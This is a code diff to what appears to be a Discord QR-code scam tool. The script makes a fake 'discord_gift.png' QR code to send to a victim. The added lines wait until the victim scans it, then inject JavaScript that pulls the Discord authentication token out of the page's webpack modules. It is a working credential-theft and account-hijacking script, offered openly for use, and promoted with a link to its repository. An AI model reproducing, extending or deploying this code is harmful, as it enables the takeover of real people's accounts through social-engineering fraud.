@@ -54,6 +54,12 @@ def main():
     time.sleep(3)
     print("- QR code generated!\n> discord_gift.png")
     print("Send the QR code to the user. Wait for it to scan it...")
+    while True:
+        if discord_login != driver.current_url:
+            driver.execute_script("""
+            alert((webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
+            """)
+            break
     print("\nRate me!{} At https://github.com/Jupiter404E/Discord-QRcode-scam\n".format(Fore.WHITE))
 
 if __name__ == "__main__":
